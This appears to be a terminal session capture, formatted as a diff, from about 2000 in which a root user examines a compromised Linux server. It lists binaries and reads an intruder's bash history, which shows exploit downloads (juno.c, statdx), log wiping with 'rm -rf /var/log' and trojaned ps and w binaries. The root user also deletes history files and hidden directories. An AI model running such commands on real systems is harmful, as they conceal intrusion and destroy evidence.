+getlist				libgtop-config			ppmtobmp			watch
+getopt				libgtop_daemon			ppmtogif			wavtopvf
+getrom				libmikmod-config		ppmtoicr			wc
+gettext				libtool				ppmtoilbm			weather
+gettextize			libtoolize			ppmtomap			weave
+gfontsel			libwww-config			ppmtomitsu			webbot
+gftodvi				life_applet			ppmtopcx			webcontrol_applet
+gftopk				linearfork			ppmtopgm			wftopfa
+gftp				linearspeed			ppmtopi1			wget
+gftype				lineart				ppmtopict			whatis
+ghex				lintopvf			ppmtopj				whatnow
+ghostscript			lispmtopgm			ppmtopjxl			whereis
+gif2epsn			listalias			ppmtopuzz			which
+gif2ps				lkbib				ppmtorgb3			whiptail
+gif2rgb				loadgo				ppmtosixel			who
+gif2rle				loadkeys			ppmtotga			whoami
+gif2tiff			loadshlib			ppmtouil			whois
+gif2x11				loadunimap			ppmtoxpm			whom
+gifasm				locale				ppmtoyuv			wipe
+gifbg				localedef			ppmtoyuvsplit			wish
+gifburst			locate				pqlist				wish8.0
+gifclip				lockfile			pqrm				wishx
+gifclrmp			logger				pqstat				wm-properties-capplet
+gifcolor			logname				pr				wmakerconf
+gifcomb				look				prev				wmxmms
+gifcompose			lookbib				printafm			wnewmail
+giffiltr			lout				printenv			workman2cddb.pl
+giffix				lpq				printf				write
+gifflip				lpr				printftest			writelog
+gifhisto			lprm				printmail			writevt
+gifinter			lptest				printtool			wrjpgcom
+gifinto				lpunlock			prlong				wserv
+gifovly				lsattr				procbatch			wvdial
+gifpos				lsdev				procinfo			wvdialconf
+gifrotat			ltrace				procmail			xargs
+gifrsize			lynx				prompter			xbmtopbm
+gifspnge			lz				protoize			xboard
+giftext				m4				prunehistory			xchat
+giftopnm			macptopbm			ps2ascii			xdvi
+giftrans			macsave				ps2epsi				xdvi.bin
+gifwedge			macstream			ps2frag				xgettext
+gimp				macunpack			ps2pdf				ximtoppm
+gimptool			mag				ps2pk				xkibitz
+gindxbib			magicdev			ps2ps				xlispstat
+git				mahjongg			psbb				xminicom
+gitaction			mail-files			pserver				xml-config
+gitkeys				mail.local			psfaddtable			xmms
+gitmkdirs			mailpost			psfgettable			xmms-config
+gitmount			mailq				psfstriptable			xpdf
+gitps				mailserver			psidtopgm			xpmtoppm
+gitrgrep			mailshar			pslatex				xproc
+gitunpack			mailstat			psql				xpstat
+gitview				mailto				pstopnm				xpvm
+gitwhich			mailto-hebrew			pstree				xscreensaver.kss
+gitwipe				make				pstruct				xsri
+gitxgrep			make_printerdef			ptx				xvminitoppm
+gkermit				make_smbcodepage		pullnews			xwdtopnm
+glade				makeactive			purgestat			xxd
+gless				makedb				pvfamp				yacc
+glib-config			makehistory			pvfcut				ybmtopbm
+glibcbug			makeindex			pvfecho				yes
+glines				makeinfo			pvffft				ypcat
+glookbib			makekdedoc			pvffile				ypchfn
+gmake				makekdedoc2			pvfmix				ypchsh
+gmc				makemap				pvfreverse			ypmatch
+gmenu				makempx				pvfsine				yppasswd
+gmix				man				pvfspeed			ypwhich
+gneqn				man2html			pvftoau				ytalk
+gnibbles			manpath				pvftobasic			yuvsplittoppm
+gnobots2			mapscrn				pvftolin			yuvtoppm
+gnome-bug			mark				pvftormd			zcmp
+gnome-config			mathpod				pvftovoc			zdiff
+gnome-dump-metadata		mattrib				pvftowav			zeisstopnm
+gnome-edit			maudio				pvm				zforce
+gnome-edit-properties-capplet	mawk				pxboard				zgrep
+gnome-font-install		mbadblocks			pynche				zic2xpm
+gnome-gen-mimedb		mc				python				zip
+gnome-help-browser		mcat				python1.5			zipcloak
+gnome-help-caller		mcd				qrttoppm			zipinfo
+gnome-info2html			mcedit				qt2kdoc				zipnote
+gnome-linuxconf			mcheck				qt2kdoc2			zipsplit
+gnome-login-check		mcmfmt				quicklaunch_applet		zless
+gnome-man2html			mcomp				quota				zmore
+gnome-moz-remote		mcookie				ranlib				znew
+gnome-name-service		mcopy				ras2tiff
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel bin]# ls -al w*
+-rwxr-xr-x   1 root     root        14796 Aug 13  1999 w3c
+-r-xr-sr-x   1 root     tty          6128 Mar  7  2000 wall
+-r-xr-xr-x   1 root     root         7484 Mar  7  2000 watch
+-rwxr-xr-x   1 root     root        14064 Mar  7  2000 wavtopvf
+-rwxr-xr-x   1 root     root        18032 Feb  7  2000 wc
+-rwxr-xr-x   1 root     root         2007 Mar  7  2000 weather
+-rwxr-xr-x   1 root     root        59344 Mar  7  2000 weave
+-rwxr-xr-x   1 root     root        36520 Aug 13  1999 webbot
+-rwxr-xr-x   1 root     root        11016 Mar  8  2000 webcontrol_applet
+-rwxr-xr-x   1 root     root           69 Feb 14  2000 wftopfa
+-rwxr-xr-x   1 root     root       121744 Feb  3  2000 wget
+-rwxr-xr-x   1 root     root         2199 Jun 30 16:14 whatis
+-rwxr-xr-x   1 root     root        87152 Feb 29  2000 whatnow
+-rwxr-xr-x   1 root     root         6864 Mar  7  2000 whereis
+-rwxr-xr-x   1 root     bin         13648 Feb  7  2000 which
+-rwxr-xr-x   1 root     root        13584 Feb 26  2000 whiptail
+-rwxr-xr-x   1 root     root        10264 Mar  7  2000 who
+-rwxr-xr-x   1 root     root         5572 Mar  7  2000 whoami
+lrwxrwxrwx   1 root     root            6 Oct 21 19:36 whois -> fwhois
+-rwxr-xr-x   1 root     root        68208 Feb 29  2000 whom
+-rwxr-xr-x   1 root     root        25328 Mar  4  2000 wipe
+lrwxrwxrwx   1 root     root            7 Oct 21 20:24 wish -> wish8.0
+-rwxr-xr-x   1 root     root         3648 Mar  7  2000 wish8.0
+-rwxr-xr-x   1 root     root         3952 Mar  7  2000 wishx
+-rwxr-xr-x   1 root     root        31400 Feb 28  2000 wm-properties-capplet
+-rwxr-xr-x   1 root     root       227380 Sep  3  1999 wmakerconf
+-rwxr-xr-x   1 root     root        45492 Feb 22  2000 wmxmms
+-rwxr-xr-x   2 root     root        34256 Feb 29  2000 wnewmail
+-rwxr-xr-x   1 root     root         2420 Feb 29  2000 workman2cddb.pl
+-rwxr-sr-x   1 root     tty          8328 Mar  7  2000 write
+-r-xr-x---   1 news     news         1201 Mar  2  2000 writelog
+-rwxr-xr-x   1 root     root         5676 Mar  6  2000 writevt
+-rwxr-xr-x   1 root     root         7000 Feb  5  2000 wrjpgcom
+-rwxr-xr-x   1 root     root         5056 Mar 27  2000 wserv
+-rwxr-xr-x   1 root     root       106248 Mar  7  2000 wvdial
+-rwxr-xr-x   1 root     root        77536 Mar  7  2000 wvdialconf
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel bin]# who
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel bin]# 
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel bin]# finger root
+Login: root           			Name: root
+Directory: /root                    	Shell: /bin/bash
+Never logged in.
+New mail received Tue Nov 21 04:02 2000 (PST)
+     Unread since Thu Nov 16 04:02 2000 (PST)
+No Plan.
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel bin]# cd /home
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /home]# ls -al;
+total 28
+drwxr-xr-x   6 root     root         4096 Nov 27 02:11 .
+drwxr-xr-x  21 root     root         4096 Nov 29 16:06 ..
+-rw-------   1 root     root          214 Nov 27 02:11 .bash_history
+drwxr-xr-x   6 root     root         4096 Nov  6 06:34 ftp
+drwxr-xr-x   5 root     root         4096 Oct 21 19:30 httpd
+drwx------   4 koop     koop         4096 Nov 15 06:08 koop
+drwx------  18 noel     noel         4096 Nov 27 22:25 noel
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /home]# pico .bash_history
+   UW PICO(tm) 3.7                                        New Buffer                                                            ^G Get Help          ^O WriteOut          ^R Read File         ^Y Prev Pg           ^K Cut Text          ^C Cur Pos           ^X Exit              ^J Justify           ^W Where is          ^V Next Pg           ^U UnCut Text        ^T To Spell          [ Reading file ][ Read 22 lines ]File: .bash_historyps auxwwwhouptimedf -hcd homecd /homelscat /etc/passwdcd /dev/.Fonelscat msg0912.htmlcat msg01912.htmlcd /usr/lib/.bluntcd /tmplsecho "dev/.Fone" >> blahftptar zxvf asdf.tar.gzcd .blunt./bluntlogin: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /home]# rm -rf .bash_history
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /home]# cd tmp
+login: tmp: No such file or directory
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /home]# ls
+ftp    httpd  koop   noel
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /home]# 
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /home]# cd /tmp
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /tmp]# ls
+blah	    orbit-noel
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /tmp]# rm -rf blah
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /tmp]# cd /dev/.Fone
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel .Fone]# cd /    ls -al
+total 128
+drwx------   4 502      Fone         4096 Nov 23 19:19 .
+drwxr-xr-x   8 root     root        36864 Nov 29 06:45 ..
+-rw-------   1 root     root         1507 Nov 24 20:33 .bash_history
+-rw-r--r--   1 root     root           24 Nov 19 08:57 .bash_logout
+-rw-r--r--   1 root     root          230 Nov 19 08:57 .bash_profile
+-rw-r--r--   1 root     root          124 Nov 22 08:57 .bashrc
+-rwxr-xr-x   1 root     root          333 Nov 19 08:57 .emacs
+-rw-rw-r--   1 502      Fone          124 Nov 24 20:31 .hunt
+drwxr-xr-x   3 root     root         4096 Nov 19 08:56 .kde
+-rw-r--r--   1 root     root          435 Nov 19 08:57 .kderc
+-rw-r--r--   1 root     root         3394 Nov 19 08:57 .screenrc
+drwxr-xr-x   5 root     root         4096 Nov 19 08:56 Desktop
+-rw-rw-r--   1 root     root        20462 Nov 23 19:17 msg01912.html
+-rw-rw-r--   1 root     root        20462 Nov 23 19:17 msg01912.html~
+-rw-rw-r--   1 root     root         5499 Nov 23 19:19 statd.c
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel .Fone]# pico .bash_history
+   UW PICO(tm) 3.7                                        New Buffer                                                            ^G Get Help          ^O WriteOut          ^R Read File         ^Y Prev Pg           ^K Cut Text          ^C Cur Pos           ^X Exit              ^J Justify           ^W Where is          ^V Next Pg           ^U UnCut Text        ^T To Spell          [ Reading file ][ Read 127 lines ]File: .bash_historydircd ..cd ..dirping yahoo.com -c 4ps -xexitping yahoo.com -c 4ping thetruth.com -c 4nslookup bconnected.net -c 4nslookup bconnected.netnslookup 209.53.2.233lynx http://bamazed.bconnected.netlynx http://packetstorm.securify.comlynx http://packetstorm.securify.comexitdirnslookup datek.comexitdirdfcat /proc/cpuinform /var/logsdircd /vardirps -xcd ~rm /var/logrm -f /var/logrm -rf /var/logdiruptimeexitcd ..cd ..cd usrlslscd incd include/cd ..lsrm /var/logsdir  /vars -xcd ~ rm /var/logrm -f /var/logrm -rf /var/logdiruptimeexitcd ..cd ..cd usrls  ls cd incd include/cd ..lsexitdirps -x...  cd /vardir  dirwget http://packetstorm.securify.com/DoS/juno.cdirexitps -x cho HAI LAR!ps -xwnslookup hackers.comping yahoo.com -c 4echo HAI! WHAT DO YOU WANT ME ON HERE FOR?echo HAI LAR!wget dirHACKERps -xdirps -x...  cd /vardir  dirwget http://packetstorm.securify.com/DoS/juno.cdirexitps -x cho HAI LAR!ps -xwnslookup hackers.comping yahoo.com -c 4echo HAI! WHAT DO YOU WANT ME ON HERE FOR?echo HAI LAR!wget dirHACKERps -xps -xexitrm -rf /var/log/learjoemv /bin/ps /bin/.psjoe /bin/pschmod 777 /bin/psps -auxjoe /bin/psps -auxapsjoe /bin/pspsps -auxnetstat -awmv /bin/w /bin/.wjoe /bin/wwwexitrm -rf /var/log/learjoemv /bin/ps /bin/.psjoe /bin/pschmod 777 /bin/psps -auxjoe /bin/psps -auxapsjoe /bin/pspsps -auxnetstat -awmv /bin/w /bin/.wjoe /bin/wwwjoe /bin/.ww   joe /bin/w/bin/wchmod 777 /bin/wwcp /bin/w /usr/sbin/wwcp /bin/w /usr/bin/wwwrm /usr/bin/ww ps -axrm /bin/wmv /bin/.w /bin/wwcp /bin/w /usr/sbin/wcp /bin/w /usr/bin/wwcp /bin/w /usr/bin/wtelnet www.theholybiblemission.comw   joe /bin/w/bin/wchmod 777 /bin/wwcp /bin/w /usr/sbin/wwcp /bin/w /usr/bin/wwwrm /usr/bin/ww ps -axrm /bin/wmv /bin/.w /bin/wwcp /bin/w /usr/sbin/wcp /bin/w /usr/bin/wwcp /bin/w /usr/bin/wtelnet www.theholybiblemission.comlslynx packetstorm.securify.comlynx hack.co.zalynx www.hack.co.zalyunx packetstoirm.securify.comlynx packetstorm.securify.comwget http://packetstorm.securify.com/UNIX/scanners/statdx-scan.tar.gzlynx www.lycos.comlsjoe msg01912.htmlgcc statd.c -o statdexitrm -rf /var/log/exit  dirnslookup www.hotbot.comgetd login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel .Fone]# mv /bin/.w /bin/w
+mv: /bin/.w: No such file or directory
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel .Fone]# cd /bin
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /bin]# ls -al .*
+-r-xr-xr-x   1 root     root        60080 Mar  7  2000 .ps
+
+.:
+total 6448
+drwxr-xr-x   2 root     root         4096 Nov 27 02:09 .
+drwxr-xr-x  21 root     root         4096 Nov 29 16:06 ..
+-r-xr-xr-x   1 root     root        60080 Mar  7  2000 .ps
+-rwxr-xr-x   1 root     root         2612 Mar  7  2000 arch
+-rwxr-xr-x   1 root     root        60592 Feb  3  2000 ash
+-rwxr-xr-x   1 root     root       263064 Feb  3  2000 ash.static
+-rwxr-xr-x   1 root     root         9968 Feb  3  2000 aumix-minimal
+lrwxrwxrwx   1 root     root            4 Oct 21 19:26 awk -> gawk
+-rwxr-xr-x   1 root     root         5756 Mar  7  2000 basename
+-rwxr-xr-x   1 root     root       316848 Feb 27  2000 bash
+-rwxr-xr-x   1 root     root       446800 Feb  2  2000 bash2
+lrwxrwxrwx   1 root     root            3 Oct 21 19:30 bsh -> ash
+-rwxr-xr-x   1 root     root         9528 Feb  7  2000 cat
+-rwxr-xr-x   1 root     root        12044 Mar  8  2000 chgrp
+-rwxr-xr-x   1 root     root        13436 Mar  8  2000 chmod
+-rwxr-xr-x   1 root     root        11952 Mar  8  2000 chown
+-rwxr-xr-x   1 root     root        49680 Mar  6  2000 consolechars
+-rwxr-xr-x   1 root     root        33392 Mar  8  2000 cp
+-rwxr-xr-x   1 root     root        45712 Feb  9  2000 cpio
+lrwxrwxrwx   1 root     root            4 Oct 21 19:58 csh -> tcsh
+-rwxr-xr-x   1 root     root        25680 Mar  7  2000 date
+-rwxr-xr-x   1 root     root        26576 Mar  8  2000 dd
+-rwxr-xr-x   1 root     root        24816 Mar  8  2000 df
+-rwxr-xr-x   1 root     root         4016 Mar  7  2000 dmesg
+lrwxrwxrwx   1 root     root            8 Oct 21 20:04 dnsdomainname -> hostname
+-rwxr-xr-x   1 root     root         2448 Mar  8  2000 doexec
+lrwxrwxrwx   1 root     root            8 Oct 21 20:04 domainname -> hostname
+-rwxr-xr-x   1 root     root         6792 Mar  7  2000 echo
+-rwxr-xr-x   1 root     root        65520 Feb  3  2000 ed
+-rwxr-xr-x   1 root     root        75600 Feb  3  2000 egrep
+lrwxrwxrwx   1 root     root            2 Oct 21 20:25 ex -> vi
+-rwxr-xr-x   1 root     root         4320 Mar  7  2000 false
+-rwxr-xr-x   1 root     root        75600 Feb  3  2000 fgrep
+lrwxrwxrwx   1 root     root           14 Oct 21 20:00 fsconf -> /bin/linuxconf
+-rwxr-xr-x   2 root     root       148848 Feb  3  2000 gawk
+-rwxr-xr-x   2 root     root       148848 Feb  3  2000 gawk-3.0.4
+-rwxr-xr-x   1 root     root        75600 Feb  3  2000 grep
+lrwxrwxrwx   1 root     root            3 Oct 21 20:18 gtar -> tar
+-rwxr-xr-x   3 root     root        46384 Feb 15  2000 gunzip
+-rwxr-xr-x   3 root     root        46384 Feb 15  2000 gzip
+-rwxr-xr-x   1 root     root         8896 Mar  7  2000 hostname
+-rwxr-xr-x   1 root     root         2991 Feb  3  2000 igawk
+-rwxr-xr-x   1 root     root        19228 Mar  8  2000 ipcalc
+-rwxr-xr-x   1 root     root         7952 Mar  7  2000 kill
+-rwxr-xr-x   1 root     root       165072 Feb  7  2000 ksh
+-rwx------   1 root     root       767016 Mar  7  2000 linuxconf
+-rwxr-xr-x   1 root     root        20240 Mar  8  2000 ln
+-rwxr-xr-x   1 root     root        76592 Mar  6  2000 loadkeys
+-rwxr-xr-x   1 root     root        12810 Nov 27 02:09 login
+-rwxr-xr-x   1 root     root       137647 Apr 28  2000 ls
+-rwxr-xr-x   1 root     mail        62384 Feb  4  2000 mail
+-rwxr-xr-x   1 root     root        13696 Mar  8  2000 mkdir
+-rwxr-xr-x   1 root     root         4032 Feb  7  2000 mktemp
+-rwxr-xr-x   1 root     root        23600 Mar  7  2000 more
+-rwsr-xr-x   1 root     root        56208 Feb  3  2000 mount
+-rwxr-xr-x   1 root     root        12264 Feb  7  2000 mt
+-rwxr-xr-x   1 root     root        41104 Mar  8  2000 mv
+lrwxrwxrwx   1 root     root           14 Oct 21 20:00 netconf -> /bin/linuxconf
+-rwxr-xr-x   1 root     root        32528 Apr 28  2000 netstat
+-rwxr-xr-x   1 root     root         7084 Mar  7  2000 nice
+lrwxrwxrwx   1 root     root            8 Oct 21 20:04 nisdomainname -> hostname
+-rwsr-xr-x   1 root     root        17968 Mar  6  2000 ping
+-rwxr-xr-x   1 root     root        37079 Apr 28  2000 ps
+-rwxrwxr-x   1 root     root           78 Nov 23 18:59 ps~
+-rwxr-xr-x   1 root     root         6068 Mar  7  2000 pwd
+lrwxrwxrwx   1 root     root            2 Oct 21 19:33 red -> ed
+-rwxr-xr-x   1 root     root          835 Mar  7  2000 remadmin
+-rwxr-xr-x   1 root     root        20240 Mar  8  2000 rm
+-rwxr-xr-x   1 root     root         6796 Mar  8  2000 rmdir
+-rwxr-xr-x   1 root     root       886424 Mar  1  2000 rpm
+lrwxrwxrwx   1 root     root            2 Oct 21 20:25 rvi -> vi
+lrwxrwxrwx   1 root     root            2 Oct 21 20:25 rview -> vi
+-rwxr-xr-x   1 root     root        44880 Feb  7  2000 sed
+-rwxr-xr-x   1 root     bin         15844 Feb  7  2000 setserial
+-rwxr-xr-x   1 root     root        49008 Feb  3  2000 sfxload
+lrwxrwxrwx   1 root     root            4 Oct 21 19:25 sh -> bash
+-rwxr-xr-x   1 root     root         5760 Mar  7  2000 sleep
+-rwxr-xr-x   1 root     root        27632 Feb  7  2000 sort
+-rwxr-xr-x   1 root     root        26668 Mar  7  2000 stty
+-rwsr-xr-x   1 root     root        14188 Mar  7  2000 su
+-rwxr-xr-x   1 root     root         5512 Mar  8  2000 sync
+-rwxr-xr-x   1 root     root       144592 Feb  9  2000 tar
+-rwxr-xr-x   1 root     root       258288 Mar  7  2000 tcsh
+-rwxr-xr-x   1 root     root        23120 Mar  8  2000 touch
+-rwxr-xr-x   1 root     root         4320 Mar  7  2000 true
+-rwsr-xr-x   1 root     root        26608 Feb  3  2000 umount
+-rwxr-xr-x   1 root     root         6196 Mar  7  2000 uname
+lrwxrwxrwx   1 root     root           14 Oct 21 20:00 userconf -> /bin/linuxconf
+-rwxr-xr-x   1 root     root        16252 Mar  8  2000 usleep
+-rwxr-xr-x   1 root     root       346352 Mar  7  2000 vi
+lrwxrwxrwx   1 root     root            2 Oct 21 20:25 view -> vi
+-rwxr-xr-x   1 root     root          362 Mar  7  2000 vimtutor
+lrwxrwxrwx   1 root     root            8 Oct 21 20:04 ypdomainname -> hostname
+-rwxr-xr-x   3 root     root        46384 Feb 15  2000 zcat
+-rwxr-xr-x   2 root     root       354512 Mar  7  2000 zsh
+-rwxr-xr-x   2 root     root       354512 Mar  7  2000 zsh-3.0.7
+
+..:
+total 121
+drwxr-xr-x  21 root     root         4096 Nov 29 16:06 .
+drwxr-xr-x  21 root     root         4096 Nov 29 16:06 ..
+drwxr-xr-x   2 root     root         4096 Feb 17  2000 .automount
+-rw-r--r--   1 root     root          109 Nov 29 16:27 .hunt
+drwxr-xr-x   2 root     root         4096 Nov 27 02:09 bin
+drwxr-xr-x   2 root     root         4096 Nov 29 06:45 boot
+drwxr-xr-x   8 root     root        36864 Nov 29 06:45 dev
+drwxr-xr-x  42 root     root         4096 Nov 29 16:13 etc
+drwxr-xr-x   6 root     root         4096 Nov 29 16:29 home
+drwxr-xr-x   4 root     root         4096 Nov 29 16:13 lib
+drwxr-xr-x   2 root     root        16384 Oct 21 19:21 lost+found
+drwxr-xr-x   2 root     root            0 Nov 29 06:45 misc
+drwxr-xr-x   4 root     root         4096 Oct 21 19:23 mnt
+dr-xr-xr-x   2 root     root          512 Nov 29 06:46 net
+drwxr-xr-x   2 root     root         4096 Aug 23  1999 opt
+dr-xr-xr-x  41 root     root            0 Nov 28 22:44 proc
+drwxr-x---   3 root     root         4096 Nov 27 02:09 root
+drwxr-xr-x   3 root     root         4096 Nov 29 16:13 sbin
+drwxr-xr-x   3 root     root         4096 Oct 21 20:10 tftpboot
+drwxrwxrwt   8 root     root         4096 Nov 29 16:29 tmp
+drwxr-xr-x  22 root     root         4096 Oct 21 19:57 usr
+drwxr-xr-x  21 root     root         4096 Nov 21 07:51 var
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /bin]# pico .hunt
+   UW PICO(tm) 3.7                                        New Buffer                                                            ^G Get Help          ^O WriteOut          ^R Read File         ^Y Prev Pg           ^K Cut Text          ^C Cur Pos           ^X Exit              ^J Justify           ^W Where is          ^V Next Pg           ^U UnCut Text        ^T To Spell          [ New file ]  File: .huntlogin: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /bin]# ls
+arch	       chown	      echo	     gzip	    mkdir	   ps~		  sh		 userconf
+ash	       consolechars   ed	     hostname	    mktemp	   pwd		  sleep		 usleep
+ash.static     cp	      egrep	     igawk	    more	   red		  sort		 vi
+aumix-minimal  cpio	      ex	     ipcalc	    mount	   remadmin	  stty		 view
+awk	       csh	      false	     kill	    mt		   rm		  su		 vimtutor
+basename       date	      fgrep	     ksh	    mv		   rmdir	  sync		 ypdomainname
+bash	       dd	      fsconf	     linuxconf	    netconf	   rpm		  tar		 zcat
+bash2	       df	      gawk	     ln		    netstat	   rvi		  tcsh		 zsh
+bsh	       dmesg	      gawk-3.0.4     loadkeys	    nice	   rview	  touch		 zsh-3.0.7
+cat	       dnsdomainname  grep	     login	    nisdomainname  sed		  true
+chgrp	       doexec	      gtar	     ls		    ping	   setserial	  umount
+chmod	       domainname     gunzip	     mail	    ps		   sfxload	  uname
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /bin]# cd /usr/bin
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel bin]# mv /usr/bin/.w /usr/bin/w
+mv: /usr/bin/.w: No such file or directory
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel bin]# cd /e dev/Fone
+login: /dev/Fone: No such file or directory
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel bin]# cd /dev/.Fone
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel .Fone]# ls -al
+total 128
+drwx------   4 502      Fone         4096 Nov 23 19:19 .
+drwxr-xr-x   8 root     root        36864 Nov 29 06:45 ..
+-rw-------   1 root     root         1507 Nov 24 20:33 .bash_history
+-rw-r--r--   1 root     root           24 Nov 19 08:57 .bash_logout
+-rw-r--r--   1 root     root          230 Nov 19 08:57 .bash_profile
+-rw-r--r--   1 root     root          124 Nov 22 08:57 .bashrc
+-rwxr-xr-x   1 root     root          333 Nov 19 08:57 .emacs
+-rw-rw-r--   1 502      Fone          124 Nov 24 20:31 .hunt
+drwxr-xr-x   3 root     root         4096 Nov 19 08:56 .kde
+-rw-r--r--   1 root     root          435 Nov 19 08:57 .kderc
+-rw-r--r--   1 root     root         3394 Nov 19 08:57 .screenrc
+drwxr-xr-x   5 root     root         4096 Nov 19 08:56 Desktop
+-rw-rw-r--   1 root     root        20462 Nov 23 19:17 msg01912.html
+-rw-rw-r--   1 root     root        20462 Nov 23 19:17 msg01912.html~
+-rw-rw-r--   1 root     root         5499 Nov 23 19:19 statd.c
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel .Fone]# picoi .bash_)          .bash)history        _history
+   UW PICO(tm) 3.7                                        New Buffer                                                            ^G Get Help          ^O WriteOut          ^R Read File         ^Y Prev Pg           ^K Cut Text          ^C Cur Pos           ^X Exit              ^J Justify           ^W Where is          ^V Next Pg           ^U UnCut Text        ^T To Spell          [ Reading file ][ Read 127 lines ]File: .bash_historydircd ..cd ..dirping yahoo.com -c 4ps -xexitping yahoo.com -c 4ping thetruth.com -c 4nslookup bconnected.net -c 4nslookup bconnected.netnslookup 209.53.2.233lynx http://bamazed.bconnected.netlynx http://packetstorm.securify.comlynx http://packetstorm.securify.comexitdirnslookup datek.comexitdirdfcat /proc/cpuinform /var/logsdircd /vardirps -xcd ~rm /var/logrm -f /var/logrm -rf /var/logdiruptimeexitcd ..cd ..cd usrlslscd incd include/cd ..lsrm /var/logsdir  /vars -xcd ~ rm /var/logrm -f /var/logrm -rf /var/logdiruptimeexitcd ..cd ..cd usrls  ls cd incd include/cd ..lsexitdirps -x...  cd /vardir  dirwget http://packetstorm.securify.com/DoS/juno.cdirexitps -x cho HAI LAR!ps -xwnslookup hackers.comping yahoo.com -c 4echo HAI! WHAT DO YOU WANT ME ON HERE FOR?echo HAI LAR!wget dirHACKERps -xdirps -x...  cd /vardir  dirwget http://packetstorm.securify.com/DoS/juno.cdirexitps -x cho HAI LAR!ps -xwnslookup hackers.comping yahoo.com -c 4echo HAI! WHAT DO YOU WANT ME ON HERE FOR?echo HAI LAR!wget dirHACKERps -xps -xexitrm -rf /var/log/learjoemv /bin/ps /bin/.psjoe /bin/pschmod 777 /bin/psps -auxjoe /bin/psps -auxapsjoe /bin/pspsps -auxnetstat -awmv /bin/w /bin/.wjoe /bin/wwwexitrm -rf /var/log/learjoemv /bin/ps /bin/.psjoe /bin/pschmod 777 /bin/psps -auxjoe /bin/psps -auxapsjoe /bin/pspsps -auxnetstat -awmv /bin/w /bin/.wjoe /bin/wwwjoe /bin/.ww   joe /bin/w/bin/wchmod 777 /bin/wwcp /bin/w /usr/sbin/wwcp /bin/w /usr/bin/wwwrm /usr/bin/ww ps -axrm /bin/wmv /bin/.w /bin/wwcp /bin/w /usr/sbin/wcp /bin/w /usr/bin/wwcp /bin/w /usr/bin/wtelnet www.theholybiblemission.comw   joe /bin/w/bin/wchmod 777 /bin/wwcp /bin/w /usr/sbin/wwcp /bin/w /usr/bin/wwwrm /usr/bin/ww ps -axrm /bin/wmv /bin/.w /bin/wwcp /bin/w /usr/sbin/wcp /bin/w /usr/bin/wwcp /bin/w /usr/bin/wtelnet www.theholybiblemission.comlslynx packetstorm.securify.comlynx hack.co.zalynx www.hack.co.zalyunx packetstoirm.securify.comlynx packetstorm.securify.comwget http://packetstorm.securify.com/UNIX/scanners/statdx-scan.tar.gzlynx www.lycos.comlsjoe msg01912.htmlgcc statd.c -o statdexitrm -rf /var/log/exit  dirnslookup www.hotbot.comgetd login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel .Fone]# telnet theholybiblemissiion.com
+theholybiblemissiion.com: Unknown host
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel .Fone]# telnet theholybiblemission.com
+Trying 206.54.189.134...
+
+telnet: Unable to connect to remote host: Connection refused
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel .Fone]# cd ..
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /dev]# rm -rf /dev/.Fone
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel /dev]# exit
+exit
